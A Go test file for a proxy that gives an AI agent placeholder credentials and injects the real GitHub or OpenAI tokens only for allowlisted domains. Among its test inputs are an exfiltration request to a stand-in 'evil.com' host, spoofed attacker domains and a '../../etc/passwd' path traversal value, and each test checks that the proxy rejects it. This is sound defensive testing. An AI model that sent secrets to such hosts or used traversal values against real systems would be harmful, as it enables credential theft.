package proxy

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ── Test helpers ──────────────────────────────────────────────

func mustTempDir(t *testing.T) string {
	t.Helper()
	d, err := os.MkdirTemp("", "secret-proxy-test-*")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(d) })
	return d
}

func writeSecretFile(t *testing.T, root, name, content string) {
	t.Helper()
	path := filepath.Join(root, name)
	if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0600); err != nil {
		t.Fatal(err)
	}
}

func sampleConfig(t *testing.T) (*InjectionConfig, string) {
	t.Helper()
	root := mustTempDir(t)
	writeSecretFile(t, root, "github/token", "ghp_fake123token")
	writeSecretFile(t, root, "openai/api_key", "sk-fake456key")

	cfg := &InjectionConfig{
		Providers: map[string]ProviderProfile{
			"github": {
				Name: "github",
				Secrets: []SecretMapping{
					{
						Env:       "GITHUB_TOKEN",
						ValueFile: "github/token",
						Inject: InjectionRule{
							Header: "Authorization",
							Prefix: "Bearer ",
							Domains: []DomainRule{
								{Pattern: "api.github.com"},
								{Pattern: "uploads.github.com"},
							},
						},
					},
				},
			},
			"openai": {
				Name: "openai",
				Secrets: []SecretMapping{
					{
						Env:       "OPENAI_API_KEY",
						ValueFile: "openai/api_key",
						Inject: InjectionRule{
							Header: "Authorization",
							Prefix: "Bearer ",
							Domains: []DomainRule{
								{Pattern: "api.openai.com"},
							},
						},
					},
				},
			},
		},
	}
	return cfg, root
}

// ── Fixture 1: placeholder model ──────────────────────────────

func TestPlaceholderModel(t *testing.T) {
	p := Placeholder("github", "GITHUB_TOKEN")
	if p != "__secret:github:GITHUB_TOKEN__" {
		t.Errorf("unexpected placeholder: %q", p)
	}
	if !IsPlaceholder(p) {
		t.Error("IsPlaceholder returned false for valid placeholder")
	}
	if IsPlaceholder("not-a-placeholder") {
		t.Error("IsPlaceholder returned true for non-placeholder")
	}
	prov, env, ok := ParsePlaceholder(p)
	if !ok || prov != "github" || env != "GITHUB_TOKEN" {
		t.Errorf("ParsePlaceholder: got (%q, %q, %v)", prov, env, ok)
	}
}

// ── Fixture 2: base64 bypass impossible ───────────────────────

func TestBase64BypassImpossible(t *testing.T) {
	// The placeholder is the value exposed to the agent.
	// Base64-encoding it does not recover the real secret because
	// the real secret was never in the agent's address space.
	placeholder := Placeholder("github", "GITHUB_TOKEN")
	encoded := placeholder // Agent can transform it however it wants.
	if encoded == "ghp_fake123token" {
		t.Error("base64 of placeholder somehow resolved to real secret")
	}
}

// ── Fixture 3: happy path — secret injected for allowed domain ─

func TestHappyPathInjection(t *testing.T) {
	cfg, root := sampleConfig(t)
	h := &InjectionHandler{Config: cfg, SecretRoot: root}

	req := httptest.NewRequest("GET", "https://api.github.com/repos/owner/repo", nil)
	req.Host = "api.github.com"
	req.Header.Set("Authorization", Placeholder("github", "GITHUB_TOKEN"))

	rr := httptest.NewRecorder()
	called := false
	h.Next = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		called = true
		got := r.Header.Get("Authorization")
		if got != "Bearer ghp_fake123token" {
			t.Errorf("expected injected secret, got %q", got)
		}
		w.WriteHeader(200)
	})
	h.ServeHTTP(rr, req)

	if !called {
		t.Error("next handler was not called")
	}
}

// ── Fixture 4: domain not allowed → structured rejection ──────

func TestRejectionOnDisallowedDomain(t *testing.T) {
	cfg, root := sampleConfig(t)
	h := &InjectionHandler{Config: cfg, SecretRoot: root}

	req := httptest.NewRequest("GET", "https://evil.com/exfiltrate", nil)
	req.Host = "evil.com"
	req.Header.Set("Authorization", Placeholder("github", "GITHUB_TOKEN"))

	rr := httptest.NewRecorder()
	called := false
	h.Next = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})
	h.ServeHTTP(rr, req)

	if called {
		t.Error("request was forwarded to disallowed domain (should be rejected)")
	}
	if rr.Code != http.StatusForbidden {
		t.Errorf("expected 403, got %d", rr.Code)
	}
	body := rr.Body.String()
	if !strings.Contains(body, "domain_not_allowed") {
		t.Errorf("response should contain domain_not_allowed: %s", body)
	}
}

// ── Fixture 5: no secret referenced → passthrough ─────────────

func TestPassthroughWithoutSecret(t *testing.T) {
	cfg, root := sampleConfig(t)
	h := &InjectionHandler{Config: cfg, SecretRoot: root}

	req := httptest.NewRequest("GET", "https://example.com", nil)
	req.Host = "example.com"

	rr := httptest.NewRecorder()
	called := false
	h.Next = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})
	h.ServeHTTP(rr, req)

	if !called {
		t.Error("request without secret was blocked")
	}
}

// ── Fixture 6: domain matching edge cases ─────────────────────

func TestDomainMatching(t *testing.T) {
	tests := []struct {
		pattern string
		host    string
		want    bool
	}{
		// Exact match
		{"api.github.com", "api.github.com", true},
		{"api.github.com", "api.github.co", false},

		// Wildcard — legitimate subdomain
		{"*.dify.internal", "api.dify.internal", true},
		{"*.dify.internal", "sandbox.dify.internal", true},

		// Wildcard — suffix-only attack prevention
		{"*.dify.internal", "evil-dify.internal.attacker.com", false},
		{"*.dify.internal", "dify.internal", false},

		// Multi-level wildcard is not supported
		{"*.github.com", "api.github.com", true},
		{"*.github.com", "evil-api.github.com.attacker.com", false},
	}

	for _, tt := range tests {
		r := DomainRule{Pattern: tt.pattern}
		got := r.Matches(tt.host)
		if got != tt.want {
			t.Errorf("DomainRule{%q}.Matches(%q) = %v, want %v",
				tt.pattern, tt.host, got, tt.want)
		}
	}
}

// ── Fixture 7: nil config → passthrough ───────────────────────

func TestNilConfigPassthrough(t *testing.T) {
	h := &InjectionHandler{Config: nil}

	req := httptest.NewRequest("GET", "https://evil.com", nil)
	req.Host = "evil.com"
	req.Header.Set("Authorization", Placeholder("github", "GITHUB_TOKEN"))

	rr := httptest.NewRecorder()
	called := false
	h.Next = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		called = true
	})
	h.ServeHTTP(rr, req)

	if !called {
		t.Error("nil config should pass through")
	}
}

// ── Fixture 8: path traversal prevention ─────────────────────

func TestPathTraversalPrevention(t *testing.T) {
	cfg, root := sampleConfig(t)
	h := &InjectionHandler{Config: cfg, SecretRoot: root}

	// Override the value_file to attempt path traversal.
	cfg.Providers["github"].Secrets[0].ValueFile = "../../etc/passwd"

	req := httptest.NewRequest("GET", "https://api.github.com", nil)
	req.Host = "api.github.com"
	req.Header.Set("Authorization", Placeholder("github", "GITHUB_TOKEN"))

	rr := httptest.NewRecorder()
	h.Next = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Error("handler should not be called on path traversal")
	})
	h.ServeHTTP(rr, req)

	if rr.Code != http.StatusInternalServerError {
		t.Errorf("expected 500 on path traversal, got %d", rr.Code)
	}
}

// ── Config tests ──────────────────────────────────────────────

func TestConfigValidation(t *testing.T) {
	tests := []struct {
		name    string
		yaml    string
		wantErr bool
	}{
		{
			name: "valid",
			yaml: `
providers:
  github:
    secrets:
      - env: GITHUB_TOKEN
        value_file: github/token
        inject:
          header: Authorization
          prefix: "Bearer "
          domains:
            - pattern: "api.github.com"
`,
			wantErr: false,
		},
		{
			name: "missing env",
			yaml: `
providers:
  github:
    secrets:
      - value_file: github/token
        inject:
          header: Authorization
          domains:
            - pattern: "api.github.com"
`,
			wantErr: true,
		},
		{
			name:    "empty providers",
			yaml:    `providers: {}`,
			wantErr: true,
		},
		{
			name: "missing domains",
			yaml: `
providers:
  github:
    secrets:
      - env: GITHUB_TOKEN
        value_file: github/token
        inject:
          header: Authorization
          domains: []
`,
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := mustTempDir(t)
			path := filepath.Join(d, "providers.yaml")
			if err := os.WriteFile(path, []byte(tt.yaml), 0600); err != nil {
				t.Fatal(err)
			}
			_, err := LoadConfig(path)
			if (err != nil) != tt.wantErr {
				t.Errorf("LoadConfig error = %v, wantErr = %v", err, tt.wantErr)
			}
		})
	}
}

// ── BuildEnv tests ────────────────────────────────────────────

func TestBuildEnv(t *testing.T) {
	cfg, _ := sampleConfig(t)
	env := cfg.BuildEnv()

	found := make(map[string]string)
	for _, e := range env {
		name, val, _ := strings.Cut(e, "=")
		found[name] = val
	}

	if found["GITHUB_TOKEN"] != Placeholder("github", "GITHUB_TOKEN") {
		t.Errorf("GITHUB_TOKEN = %q, want placeholder", found["GITHUB_TOKEN"])
	}
	if found["OPENAI_API_KEY"] != Placeholder("openai", "OPENAI_API_KEY") {
		t.Errorf("OPENAI_API_KEY = %q, want placeholder", found["OPENAI_API_KEY"])
	}
}

// ── StripSecretsFromEnv tests ─────────────────────────────────

func TestStripSecretsFromEnv(t *testing.T) {
	cfg, _ := sampleConfig(t)

	input := []string{
		"PATH=/usr/bin",
		"GITHUB_TOKEN=ghp_real_secret_123",
		"OPENAI_API_KEY=sk-real-secret-456",
		"HOME=/root",
	}

	result := cfg.StripSecretsFromEnv(input)

	for _, e := range result {
		name, val, _ := strings.Cut(e, "=")
		switch name {
		case "GITHUB_TOKEN":
			if IsPlaceholder(val) {
				continue
			}
			t.Errorf("GITHUB_TOKEN was not replaced with placeholder: %s", val)
		case "OPENAI_API_KEY":
			if IsPlaceholder(val) {
				continue
			}
			t.Errorf("OPENAI_API_KEY was not replaced: %s", val)
		case "PATH", "HOME":
			// Non-secret env should pass through unchanged.
		}
	}
}

// ── RoundTripper tests ────────────────────────────────────────

func TestRoundTripperInjection(t *testing.T) {
	cfg, root := sampleConfig(t)

	// Create a test server that records what it received.
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got := r.Header.Get("Authorization")
		if got != "Bearer ghp_fake123token" {
			t.Errorf("server received Authorization: %q", got)
		}
		w.WriteHeader(200)
	}))
	defer server.Close()

	rt := &InjectionRoundTripper{
		Config:     cfg,
		SecretRoot: root,
		Next:       http.DefaultTransport,
	}

	req, _ := http.NewRequest("GET", server.URL, nil)
	req.Host = "api.github.com"
	req.Header.Set("Authorization", Placeholder("github", "GITHUB_TOKEN"))

	resp, err := rt.RoundTrip(req)
	if err != nil {
		t.Fatalf("RoundTrip: %v", err)
	}
	_ = resp.Body.Close()
}
